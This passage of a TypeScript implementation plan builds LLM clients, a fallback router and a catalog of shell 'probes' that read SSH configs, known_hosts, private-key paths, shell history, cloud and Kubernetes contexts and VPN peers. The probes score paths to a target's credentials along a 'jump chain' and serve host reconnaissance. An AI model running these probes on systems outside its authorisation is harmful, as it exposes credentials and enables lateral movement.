  it('throws on missing API key', async () => {
    await expect(groqCall('', { shape: 'classify', system: 's', user: 'u' })).rejects.toThrow(/api key/i);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/llm/groq.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/llm/groq.ts`:

```typescript
import type { BrainCall, BrainResponse } from './router';

const MODEL = 'llama-3.3-70b-versatile';
const URL = 'https://api.groq.com/openai/v1/chat/completions';

export class RateLimited extends Error { name = 'RateLimited'; }
export class ProviderUnavailable extends Error { name = 'ProviderUnavailable'; }

export async function groqCall(
  apiKey: string,
  req: BrainCall,
  fetchImpl: typeof fetch = fetch,
): Promise<BrainResponse> {
  if (!apiKey) throw new Error('groq: api key required');
  const res = await fetchImpl(URL, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      model: MODEL,
      messages: [
        { role: 'system', content: req.system },
        { role: 'user', content: req.user },
      ],
      max_tokens: 512,
      temperature: 0.1,
    }),
  });
  if (res.status === 429) throw new RateLimited('groq rate limited');
  if (!res.ok) throw new ProviderUnavailable(`groq ${res.status}`);
  const j = await res.json() as { choices: { message: { content: string } }[]; usage?: { total_tokens?: number } };
  return {
    provider: 'groq',
    model: MODEL,
    output: j.choices[0]?.message.content ?? '',
    tokensUsed: j.usage?.total_tokens ?? 0,
    costUsd: 0,
    isPaidTier: false,
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/llm/groq.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/llm/groq.ts tests/llm/groq.test.ts
git commit -m "feat: Groq client (llama-3.3-70b, free, sanity-eligible)"
```

---

### Task 18: OpenRouter client (free + paid)

**Files:**
- Create: `src/llm/openrouter.ts`
- Create: `tests/llm/openrouter.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/llm/openrouter.test.ts`:

```typescript
import { describe, it, expect, vi } from 'vitest';
import { openRouterCall } from '../../src/llm/openrouter';

describe('openRouterCall', () => {
  it('uses free model when tier=free and reports cost=0', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({
      choices: [{ message: { content: 'NO_GO' } }],
      usage: { total_tokens: 10, prompt_tokens: 5, completion_tokens: 5 },
    }), { status: 200 }));
    const r = await openRouterCall('k', { shape: 'sanity_check', system: 's', user: 'u' }, 'free', fetchMock as never);
    expect(r.isPaidTier).toBe(false);
    expect(r.costUsd).toBe(0);
    expect(r.model).toMatch(/free/);
  });

  it('uses paid model when tier=paid and computes cost from usage', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({
      choices: [{ message: { content: 'GO' } }],
      usage: { total_tokens: 1000, prompt_tokens: 500, completion_tokens: 500 },
    }), { status: 200 }));
    const r = await openRouterCall('k', { shape: 'sanity_check', system: 's', user: 'u' }, 'paid', fetchMock as never);
    expect(r.isPaidTier).toBe(true);
    expect(r.costUsd).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/llm/openrouter.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/llm/openrouter.ts`:

```typescript
import type { BrainCall, BrainResponse } from './router';
import { RateLimited, ProviderUnavailable } from './groq';

const URL = 'https://openrouter.ai/api/v1/chat/completions';

const FREE_MODEL = 'meta-llama/llama-3.3-70b-instruct:free';
const PAID_MODEL = 'anthropic/claude-3.5-sonnet';
const PAID_PRICE_PROMPT_USD_PER_K = 0.003;
const PAID_PRICE_COMPLETION_USD_PER_K = 0.015;

export async function openRouterCall(
  apiKey: string,
  req: BrainCall,
  tier: 'free' | 'paid',
  fetchImpl: typeof fetch = fetch,
): Promise<BrainResponse> {
  if (!apiKey) throw new Error('openrouter: api key required');
  const model = tier === 'free' ? FREE_MODEL : PAID_MODEL;
  const res = await fetchImpl(URL, {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      model,
      messages: [{ role: 'system', content: req.system }, { role: 'user', content: req.user }],
      max_tokens: 512,
      temperature: 0.1,
    }),
  });
  if (res.status === 429) throw new RateLimited('openrouter rate limited');
  if (!res.ok) throw new ProviderUnavailable(`openrouter ${res.status}`);
  const j = await res.json() as {
    choices: { message: { content: string } }[];
    usage: { total_tokens: number; prompt_tokens?: number; completion_tokens?: number };
  };
  let costUsd = 0;
  if (tier === 'paid') {
    const p = j.usage.prompt_tokens ?? 0;
    const c = j.usage.completion_tokens ?? 0;
    costUsd = (p / 1000) * PAID_PRICE_PROMPT_USD_PER_K + (c / 1000) * PAID_PRICE_COMPLETION_USD_PER_K;
  }
  return {
    provider: 'openrouter',
    model,
    output: j.choices[0]?.message.content ?? '',
    tokensUsed: j.usage.total_tokens,
    costUsd,
    isPaidTier: tier === 'paid',
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/llm/openrouter.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/llm/openrouter.ts tests/llm/openrouter.test.ts
git commit -m "feat: OpenRouter client (free + paid tiers, cost tracking)"
```

---

### Task 19: Router with fallback chain + sanity policy

**Files:**
- Create: `src/llm/router.ts`
- Create: `tests/llm/router.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/llm/router.test.ts`:

```typescript
import { describe, it, expect, vi } from 'vitest';
import { routerCall, SanityUnavailable } from '../../src/llm/router';
import type { MissionState } from '../../src/types';

const baseMission: MissionState = {
  mission_id: 'm', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'planning', honor_tier: 'gold',
  budget_paid_usd_remaining: 10, strict_gold: true,
  wall_clock_started_ms: Date.now(), wall_clock_deadline_ms: Date.now() + 86_400_000,
  tick: 0, beliefs: {}, jump_chain: ['origin'],
  target_allowlist: ['origin', 'kvm2'],
};

describe('router', () => {
  it('classify uses Workers AI', async () => {
    const aiRun = vi.fn().mockResolvedValue({ response: 'yes' });
    const r = await routerCall(
      { shape: 'classify', system: 's', user: 'u' }, baseMission,
      { ai: { run: aiRun } as never, groqKey: '', openrouterKey: '', fetch: undefined as never },
    );
    expect(r.provider).toBe('workers-ai');
    expect(aiRun).toHaveBeenCalled();
  });

  it('sanity_check tries Groq first', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({
      choices: [{ message: { content: 'GO' } }], usage: { total_tokens: 5 },
    }), { status: 200 }));
    const r = await routerCall(
      { shape: 'sanity_check', system: 's', user: 'u' }, baseMission,
      { ai: { run: vi.fn() } as never, groqKey: 'gk', openrouterKey: 'ok', fetch: fetchMock as never },
    );
    expect(r.provider).toBe('groq');
  });

  it('sanity_check fails closed under strict_gold when free 70B exhausted', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response('{}', { status: 429 }));
    await expect(routerCall(
      { shape: 'sanity_check', system: 's', user: 'u' }, baseMission,
      { ai: { run: vi.fn() } as never, groqKey: 'gk', openrouterKey: 'ok', fetch: fetchMock as never },
    )).rejects.toBeInstanceOf(SanityUnavailable);
  });

  it('sanity_check escalates to paid when not strict_gold', async () => {
    let calls = 0;
    const fetchMock = vi.fn().mockImplementation((url: string) => {
      calls++;
      if (calls < 3) return Promise.resolve(new Response('{}', { status: 429 }));
      return Promise.resolve(new Response(JSON.stringify({
        choices: [{ message: { content: 'GO' } }],
        usage: { total_tokens: 100, prompt_tokens: 50, completion_tokens: 50 },
      }), { status: 200 }));
    });
    const r = await routerCall(
      { shape: 'sanity_check', system: 's', user: 'u' },
      { ...baseMission, strict_gold: false },
      { ai: { run: vi.fn() } as never, groqKey: 'gk', openrouterKey: 'ok', fetch: fetchMock as never },
    );
    expect(r.isPaidTier).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/llm/router.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/llm/router.ts`:

```typescript
import type { MissionState } from '../types';
import { workersAiCall } from './workers-ai';
import { groqCall, RateLimited, ProviderUnavailable } from './groq';
import { openRouterCall } from './openrouter';

export type CallShape = 'classify' | 'extract' | 'route' | 'sanity_check';

export interface BrainCall {
  shape: CallShape;
  system: string;
  user: string;
  schema?: object;
}

export interface BrainResponse {
  provider: string;
  model: string;
  output: string;
  tokensUsed: number;
  costUsd: number;
  isPaidTier: boolean;
}

export interface RouterDeps {
  ai: Ai;
  groqKey: string;
  openrouterKey: string;
  fetch?: typeof fetch;
}

export class SanityUnavailable extends Error { name = 'SanityUnavailable'; }

export async function routerCall(
  req: BrainCall, m: MissionState, deps: RouterDeps,
): Promise<BrainResponse> {
  if (req.shape === 'sanity_check') return sanityChain(req, m, deps);
  return routineChain(req, m, deps);
}

async function routineChain(req: BrainCall, _m: MissionState, deps: RouterDeps): Promise<BrainResponse> {
  try { return await workersAiCall(deps.ai, req); }
  catch (e) { /* fall through */ }
  if (deps.groqKey) {
    try { return await groqCall(deps.groqKey, req, deps.fetch); }
    catch (e) { /* fall through */ }
  }
  if (deps.openrouterKey) {
    try { return await openRouterCall(deps.openrouterKey, req, 'free', deps.fetch); }
    catch (e) { /* fall through */ }
  }
  throw new ProviderUnavailable('all routine providers exhausted');
}

async function sanityChain(req: BrainCall, m: MissionState, deps: RouterDeps): Promise<BrainResponse> {
  if (deps.groqKey) {
    try { return await groqCall(deps.groqKey, req, deps.fetch); }
    catch (e) { if (!(e instanceof RateLimited || e instanceof ProviderUnavailable)) throw e; }
  }
  if (deps.openrouterKey) {
    try { return await openRouterCall(deps.openrouterKey, req, 'free', deps.fetch); }
    catch (e) { if (!(e instanceof RateLimited || e instanceof ProviderUnavailable)) throw e; }
  }
  if (m.strict_gold) {
    throw new SanityUnavailable('strict_gold: free 70B-class exhausted, refusing 8B fallback');
  }
  if (deps.openrouterKey && m.budget_paid_usd_remaining > 0) {
    return openRouterCall(deps.openrouterKey, req, 'paid', deps.fetch);
  }
  throw new SanityUnavailable('no paid budget available for sanity_check escalation');
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/llm/router.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/llm/router.ts tests/llm/router.test.ts
git commit -m "feat: LLM router with sanity policy + strict_gold fail-closed"
```

---

## Phase E — Probe catalog (Tasks 20–23)

### Task 20: Probe manifest schema

**Files:**
- Create: `src/catalog/manifest.ts`
- Create: `tests/catalog/manifest.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/catalog/manifest.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { isManifest, validateManifest } from '../../src/catalog/manifest';

const valid = {
  id: 'ssh-config-scan',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux: 'cat ~/.ssh/config', macos: 'cat ~/.ssh/config', wsl: 'cat ~/.ssh/config' },
  outputSchema: { type: 'object', properties: { hosts: { type: 'array' } } },
  llrContributions: [
    { pattern: 'host_entry_matches_target_name', targetHypothesis: 'h:target-address', llr: 4.0 },
  ],
  eigPrior: 0.6,
  wallClockEstimateS: 2,
  tokenCostEstimate: 0,
  fallbackProbeIds: ['known-hosts-enum'],
};

describe('probe manifest', () => {
  it('isManifest accepts valid', () => {
    expect(isManifest(valid)).toBe(true);
  });

  it('rejects missing platforms', () => {
    expect(isManifest({ ...valid, platforms: [] })).toBe(false);
  });

  it('rejects missing body for declared platform', () => {
    const m = { ...valid, bodyByPlatform: { linux: 'x' } };
    const err = validateManifest(m);
    expect(err).toMatch(/macos/);
  });

  it('rejects negative eigPrior', () => {
    const err = validateManifest({ ...valid, eigPrior: -0.1 });
    expect(err).toMatch(/eigPrior/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/catalog/manifest.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/catalog/manifest.ts`:

```typescript
export type Platform = 'linux' | 'macos' | 'wsl';

export interface LLRContribution {
  pattern: string;
  targetHypothesis: string;
  llr: number;
}

export interface ProbeManifest {
  id: string;
  platforms: Platform[];
  bodyByPlatform: Partial<Record<Platform, string>>;
  outputSchema: Record<string, unknown>;
  llrContributions: LLRContribution[];
  eigPrior: number;
  wallClockEstimateS: number;
  tokenCostEstimate: number;
  fallbackProbeIds: string[];
}

export function isManifest(x: unknown): x is ProbeManifest {
  return validateManifest(x) === null;
}

export function validateManifest(x: unknown): string | null {
  if (typeof x !== 'object' || x === null) return 'not an object';
  const m = x as Record<string, unknown>;
  if (typeof m.id !== 'string' || m.id.length === 0) return 'id required';
  if (!Array.isArray(m.platforms) || m.platforms.length === 0) return 'platforms required';
  for (const p of m.platforms as string[]) {
    if (!['linux', 'macos', 'wsl'].includes(p)) return `bad platform: ${p}`;
    if (typeof (m.bodyByPlatform as Record<string, unknown> | undefined)?.[p] !== 'string') {
      return `bodyByPlatform.${p} required`;
    }
  }
  if (typeof m.eigPrior !== 'number' || m.eigPrior < 0 || m.eigPrior > 1) return 'eigPrior must be in [0,1]';
  if (typeof m.wallClockEstimateS !== 'number' || m.wallClockEstimateS < 0) return 'wallClockEstimateS required';
  if (typeof m.tokenCostEstimate !== 'number' || m.tokenCostEstimate < 0) return 'tokenCostEstimate required';
  if (!Array.isArray(m.llrContributions)) return 'llrContributions required';
  if (!Array.isArray(m.fallbackProbeIds)) return 'fallbackProbeIds required';
  return null;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/catalog/manifest.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/catalog/manifest.ts tests/catalog/manifest.test.ts
git commit -m "feat: probe manifest schema + validator"
```

---

### Task 21: Catalog seeder + parameterized validation harness

**Files:**
- Create: `src/catalog/seed.ts`
- Create: `src/catalog/registry.ts`
- Create: `tests/catalog/registry.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/catalog/registry.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { env } from 'cloudflare:test';
import { ALL_PROBES } from '../../src/catalog/registry';
import { validateManifest } from '../../src/catalog/manifest';
import { seedCatalog, loadProbe } from '../../src/catalog/seed';

describe('probe registry', () => {
  it.each(ALL_PROBES)('manifest $id validates', (m) => {
    expect(validateManifest(m)).toBeNull();
  });

  it('seedCatalog writes every probe to KV', async () => {
    await seedCatalog(env.HYDRA_KV);
    for (const m of ALL_PROBES) {
      const got = await loadProbe(env.HYDRA_KV, m.id);
      expect(got?.id).toBe(m.id);
    }
  });

  it('loadProbe returns null for unknown id', async () => {
    expect(await loadProbe(env.HYDRA_KV, 'nope')).toBeNull();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: FAIL — `ALL_PROBES` empty, modules don't exist.

- [ ] **Step 3: Write minimal implementation**

`src/catalog/registry.ts`:

```typescript
import type { ProbeManifest } from './manifest';

// Modules are appended in Tasks 22-23. Empty array makes the validation
// harness pass on an empty set; it.each over an empty array is a no-op.
export const ALL_PROBES: ProbeManifest[] = [];
```

`src/catalog/seed.ts`:

```typescript
import type { ProbeManifest } from './manifest';
import { ALL_PROBES } from './registry';
import { putCatalogEntry, getCatalogEntry } from '../storage';

export async function seedCatalog(kv: KVNamespace): Promise<number> {
  for (const m of ALL_PROBES) {
    await putCatalogEntry(kv, m.id, JSON.stringify(m));
  }
  return ALL_PROBES.length;
}

export async function loadProbe(kv: KVNamespace, id: string): Promise<ProbeManifest | null> {
  const raw = await getCatalogEntry(kv, id);
  if (!raw) return null;
  return JSON.parse(raw) as ProbeManifest;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: PASS, 2 tests (the `it.each` is a no-op until Tasks 22-23 add probes; the loadProbe-null test passes; seedCatalog writes 0 probes and the for-loop over ALL_PROBES is empty).

- [ ] **Step 5: Commit**

```bash
git add src/catalog/seed.ts src/catalog/registry.ts tests/catalog/registry.test.ts
git commit -m "feat: catalog seeder + registry scaffold"
```

---

### Task 22: Tier 1 probes (SSH-adjacent — 5 modules × 3 platforms)

**Files:**
- Create: `src/catalog/probes/ssh-config-scan.ts`
- Create: `src/catalog/probes/known-hosts-enum.ts`
- Create: `src/catalog/probes/private-key-enum.ts`
- Create: `src/catalog/probes/shell-history-grep.ts`
- Create: `src/catalog/probes/hosts-file.ts`
- Modify: `src/catalog/registry.ts`

- [ ] **Step 1: Write the failing test**

The test from Task 21 (`registry.test.ts`) will now run `it.each` over 5 manifests and `seedCatalog` will write 5 entries. No new test file; we're extending coverage by extending `ALL_PROBES`.

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: FAIL — modules not yet in registry.

- [ ] **Step 3: Write minimal implementation**

`src/catalog/probes/ssh-config-scan.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
[ -f "$HOME/.ssh/config" ] && cat "$HOME/.ssh/config" 2>/dev/null || true
[ -f /etc/ssh/ssh_config ] && cat /etc/ssh/ssh_config 2>/dev/null || true
`;

export const sshConfigScan: ProbeManifest = {
  id: 'ssh-config-scan',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { raw: { type: 'string' } } },
  llrContributions: [
    { pattern: 'host_entry_matches_target_name', targetHypothesis: 'h:target-address', llr: 4.0 },
    { pattern: 'host_entry_with_identityfile', targetHypothesis: 'h:target-credentials', llr: 2.5 },
    { pattern: 'no_config_file', targetHypothesis: 'h:target-address', llr: -0.3 },
  ],
  eigPrior: 0.7,
  wallClockEstimateS: 1,
  tokenCostEstimate: 200,
  fallbackProbeIds: ['known-hosts-enum'],
};
```

`src/catalog/probes/known-hosts-enum.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
[ -f "$HOME/.ssh/known_hosts" ] && awk '{print $1}' "$HOME/.ssh/known_hosts" | tr ',' '\\n' | sort -u || true
`;

export const knownHostsEnum: ProbeManifest = {
  id: 'known-hosts-enum',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { hosts: { type: 'array' } } },
  llrContributions: [
    { pattern: 'target_name_present', targetHypothesis: 'h:target-address', llr: 3.5 },
    { pattern: 'target_ip_present', targetHypothesis: 'h:target-address', llr: 4.5 },
  ],
  eigPrior: 0.5,
  wallClockEstimateS: 1,
  tokenCostEstimate: 150,
  fallbackProbeIds: ['hosts-file'],
};
```

`src/catalog/probes/private-key-enum.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
ls -la "$HOME/.ssh" 2>/dev/null | awk '{print $9}' | grep -E '^(id_|.*\\.pem$|.*_ed25519$|.*_rsa$)' || true
for f in "$HOME"/.ssh/*; do
  [ -f "$f" ] || continue
  case "$(head -c 30 "$f" 2>/dev/null)" in
    *PRIVATE*KEY*) echo "PRIVKEY:$f" ;;
  esac
done
`;

export const privateKeyEnum: ProbeManifest = {
  id: 'private-key-enum',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { keys: { type: 'array' } } },
  llrContributions: [
    { pattern: 'key_filename_matches_target', targetHypothesis: 'h:target-credentials', llr: 5.0 },
    { pattern: 'key_paired_with_known_host', targetHypothesis: 'h:target-credentials', llr: 3.0 },
  ],
  eigPrior: 0.6,
  wallClockEstimateS: 1,
  tokenCostEstimate: 200,
  fallbackProbeIds: ['shell-history-grep'],
};
```

`src/catalog/probes/shell-history-grep.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.local/share/fish/fish_history"; do
  [ -f "$f" ] && grep -E '^(ssh|scp|rsync|git@|sftp) ' "$f" 2>/dev/null | tail -200 || true
done
`;

export const shellHistoryGrep: ProbeManifest = {
  id: 'shell-history-grep',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { lines: { type: 'array' } } },
  llrContributions: [
    { pattern: 'ssh_invocation_to_target', targetHypothesis: 'h:target-address', llr: 5.5 },
    { pattern: 'ssh_invocation_with_keyfile', targetHypothesis: 'h:target-credentials', llr: 4.0 },
  ],
  eigPrior: 0.55,
  wallClockEstimateS: 1,
  tokenCostEstimate: 300,
  fallbackProbeIds: ['hosts-file'],
};
```

`src/catalog/probes/hosts-file.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
cat /etc/hosts 2>/dev/null || true
[ -d /etc/hosts.d ] && for f in /etc/hosts.d/*; do [ -f "$f" ] && cat "$f"; done || true
`;

export const hostsFile: ProbeManifest = {
  id: 'hosts-file',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { entries: { type: 'array' } } },
  llrContributions: [
    { pattern: 'target_name_in_hosts', targetHypothesis: 'h:target-address', llr: 6.0 },
  ],
  eigPrior: 0.4,
  wallClockEstimateS: 1,
  tokenCostEstimate: 100,
  fallbackProbeIds: ['cloud-cli-enum'],
};
```

`src/catalog/registry.ts` (replace empty array):

```typescript
import type { ProbeManifest } from './manifest';
import { sshConfigScan } from './probes/ssh-config-scan';
import { knownHostsEnum } from './probes/known-hosts-enum';
import { privateKeyEnum } from './probes/private-key-enum';
import { shellHistoryGrep } from './probes/shell-history-grep';
import { hostsFile } from './probes/hosts-file';

export const ALL_PROBES: ProbeManifest[] = [
  sshConfigScan, knownHostsEnum, privateKeyEnum, shellHistoryGrep, hostsFile,
];
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: PASS — 5 manifest validations + seed + load.

Also lint with shellcheck against extracted bodies:

```bash
node -e "const {ALL_PROBES} = require('./src/catalog/registry'); for (const m of ALL_PROBES) for (const [p,b] of Object.entries(m.bodyByPlatform)) require('fs').writeFileSync(\`/tmp/\${m.id}-\${p}.sh\`, b);"
shellcheck /tmp/*.sh
```

Fix any warnings (quote vars, etc.), then re-run vitest.

- [ ] **Step 5: Commit**

```bash
git add src/catalog/probes/ src/catalog/registry.ts
git commit -m "feat: Tier 1 probe catalog (5 SSH-adjacent modules × 3 platforms)"
```

---

### Task 23: Tier 2 probes (infra reach — 5 modules × 3 platforms)

**Files:**
- Create: `src/catalog/probes/cloud-cli-enum.ts`
- Create: `src/catalog/probes/k8s-context-enum.ts`
- Create: `src/catalog/probes/vpn-mesh-probe.ts`
- Create: `src/catalog/probes/docker-compose-scan.ts`
- Create: `src/catalog/probes/git-config-scan.ts`
- Modify: `src/catalog/registry.ts`

- [ ] **Step 1: Write the failing test**

Same `tests/catalog/registry.test.ts` will now validate 10 probes total.

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: FAIL — Tier 2 not yet in registry.

- [ ] **Step 3: Write minimal implementation**

`src/catalog/probes/cloud-cli-enum.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
command -v aws >/dev/null && aws ec2 describe-instances --query 'Reservations[].Instances[].{n:Tags[?Key==\\\`Name\\\`]|[0].Value,ip:PublicIpAddress,priv:PrivateIpAddress}' --output json 2>/dev/null || true
command -v gcloud >/dev/null && gcloud compute instances list --format=json 2>/dev/null || true
command -v az >/dev/null && az vm list -d --output json 2>/dev/null || true
command -v doctl >/dev/null && doctl compute droplet list --output json 2>/dev/null || true
command -v hcloud >/dev/null && hcloud server list -o json 2>/dev/null || true
`;

export const cloudCliEnum: ProbeManifest = {
  id: 'cloud-cli-enum',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { instances: { type: 'array' } } },
  llrContributions: [
    { pattern: 'instance_name_matches_target', targetHypothesis: 'h:target-address', llr: 5.0 },
    { pattern: 'instance_tag_role_matches', targetHypothesis: 'h:target-address', llr: 3.0 },
  ],
  eigPrior: 0.6,
  wallClockEstimateS: 8,
  tokenCostEstimate: 600,
  fallbackProbeIds: ['k8s-context-enum'],
};
```

`src/catalog/probes/k8s-context-enum.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
[ -f "$HOME/.kube/config" ] || exit 0
command -v kubectl >/dev/null || exit 0
kubectl config get-contexts -o name 2>/dev/null | while read -r ctx; do
  reach=$(kubectl --context="$ctx" auth can-i list nodes 2>/dev/null || echo "no")
  echo "$ctx:$reach"
done
`;

export const k8sContextEnum: ProbeManifest = {
  id: 'k8s-context-enum',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { contexts: { type: 'array' } } },
  llrContributions: [
    { pattern: 'context_name_matches_target', targetHypothesis: 'h:target-address', llr: 4.5 },
    { pattern: 'reachable_node_in_context', targetHypothesis: 'h:network-path', llr: 3.0 },
  ],
  eigPrior: 0.4,
  wallClockEstimateS: 5,
  tokenCostEstimate: 400,
  fallbackProbeIds: ['vpn-mesh-probe'],
};
```

`src/catalog/probes/vpn-mesh-probe.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
command -v tailscale >/dev/null && tailscale status --json 2>/dev/null || true
command -v wg >/dev/null && wg show 2>/dev/null || true
command -v nmcli >/dev/null && nmcli con show --active 2>/dev/null || true
`;

export const vpnMeshProbe: ProbeManifest = {
  id: 'vpn-mesh-probe',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { peers: { type: 'array' } } },
  llrContributions: [
    { pattern: 'tailscale_peer_matches_target', targetHypothesis: 'h:target-address', llr: 6.0 },
    { pattern: 'wireguard_endpoint_matches_target', targetHypothesis: 'h:target-address', llr: 5.0 },
  ],
  eigPrior: 0.45,
  wallClockEstimateS: 3,
  tokenCostEstimate: 250,
  fallbackProbeIds: ['docker-compose-scan'],
};
```

`src/catalog/probes/docker-compose-scan.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
find "$HOME" -maxdepth 5 -name 'docker-compose*.y*ml' 2>/dev/null | head -50 | while read -r f; do
  echo "FILE:$f"
  cat "$f" 2>/dev/null | head -200
  echo "---"
done
`;

export const dockerComposeScan: ProbeManifest = {
  id: 'docker-compose-scan',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { services: { type: 'array' } } },
  llrContributions: [
    { pattern: 'service_name_matches_target', targetHypothesis: 'h:target-address', llr: 3.0 },
    { pattern: 'service_hostname_alias_matches', targetHypothesis: 'h:target-address', llr: 4.0 },
  ],
  eigPrior: 0.3,
  wallClockEstimateS: 4,
  tokenCostEstimate: 400,
  fallbackProbeIds: ['git-config-scan'],
};
```

`src/catalog/probes/git-config-scan.ts`:

```typescript
import type { ProbeManifest } from '../manifest';

const linux = `
set -eu
cat "$HOME/.gitconfig" 2>/dev/null || true
find "$HOME" -maxdepth 4 -name 'config' -path '*.git/config' 2>/dev/null | head -50 | while read -r f; do
  grep -E '(url|remote|host)' "$f" 2>/dev/null || true
done
`;

export const gitConfigScan: ProbeManifest = {
  id: 'git-config-scan',
  platforms: ['linux', 'macos', 'wsl'],
  bodyByPlatform: { linux, macos: linux, wsl: linux },
  outputSchema: { type: 'object', properties: { remotes: { type: 'array' } } },
  llrContributions: [
    { pattern: 'remote_url_contains_target', targetHypothesis: 'h:target-address', llr: 3.5 },
  ],
  eigPrior: 0.25,
  wallClockEstimateS: 3,
  tokenCostEstimate: 250,
  fallbackProbeIds: [],
};
```

`src/catalog/registry.ts` (extend):

```typescript
import type { ProbeManifest } from './manifest';
import { sshConfigScan } from './probes/ssh-config-scan';
import { knownHostsEnum } from './probes/known-hosts-enum';
import { privateKeyEnum } from './probes/private-key-enum';
import { shellHistoryGrep } from './probes/shell-history-grep';
import { hostsFile } from './probes/hosts-file';
import { cloudCliEnum } from './probes/cloud-cli-enum';
import { k8sContextEnum } from './probes/k8s-context-enum';
import { vpnMeshProbe } from './probes/vpn-mesh-probe';
import { dockerComposeScan } from './probes/docker-compose-scan';
import { gitConfigScan } from './probes/git-config-scan';

export const ALL_PROBES: ProbeManifest[] = [
  sshConfigScan, knownHostsEnum, privateKeyEnum, shellHistoryGrep, hostsFile,
  cloudCliEnum, k8sContextEnum, vpnMeshProbe, dockerComposeScan, gitConfigScan,
];
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/catalog/registry.test.ts
```

Expected: PASS — 10 manifest validations + seed + load.

Re-run shellcheck:

```bash
shellcheck /tmp/*.sh
```

Fix warnings, re-run vitest.

- [ ] **Step 5: Commit**

```bash
git add src/catalog/probes/ src/catalog/registry.ts
git commit -m "feat: Tier 2 probe catalog (5 infra-reach modules × 3 platforms)"
```

---

## Phase F — Tick engine (Tasks 24–28)

### Task 24: EIG-weighted priority queue

**Files:**
- Create: `src/engine/queue.ts`
- Create: `tests/engine/queue.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/queue.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { newQueue, enqueue, popHighest, rescore, size } from '../../src/engine/queue';

describe('priority queue', () => {
  it('pops in descending priority', () => {
    let q = newQueue();
    q = enqueue(q, { id: 'p1', probeId: 'a', value: 0.3, eta_s: 5, tokenCost: 0, targetHypotheses: [], fallbackIds: [] });
